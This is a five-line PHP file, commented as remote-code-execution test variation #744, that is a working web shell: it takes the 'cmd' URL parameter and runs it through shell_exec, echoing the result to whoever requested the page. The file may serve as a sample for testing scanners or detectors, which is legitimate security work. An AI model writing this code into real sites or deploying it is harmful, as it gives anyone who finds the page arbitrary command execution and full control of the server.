<?php
// RCE test variation #744
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>